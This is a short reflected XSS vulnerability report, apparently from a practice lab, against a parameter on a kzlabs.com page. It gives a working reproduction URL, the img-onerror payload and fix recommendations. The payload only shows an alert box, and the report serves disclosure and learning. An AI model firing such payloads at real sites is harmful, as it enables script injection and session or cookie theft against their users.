## Title
Reflected Cross-Site Scripting (XSS)

## Summary
Reflected XSS vulnerability in:
`https://kzlabs.com/punishment/8.php`

## Steps to Reproduce
1. Open URL:
`https://kzlabs.com/punishment/8.php?fname=%3CimG+src%3Dx+onerror%3Dalert%28%22RAJVARDHANNNNN%22%29%3E`

2. Observe execution.

## Payload Used
`<img src=x onerror=alert("RAJVARDHANNNNN")>`

## Proof of Concept
## Screenshot — Vulnerable application confirming XSS execution
<img width="1919" height="806" alt="image" src="https://github.com/user-attachments/assets/772cf7c6-9074-4927-b896-f2466fa7bbc3" />


## Impact
- Session hijacking
- Cookie theft
- JS execution in browser

## Recommendations for Fix
- Encode output
- Validate input
- Avoid unsafe sinks
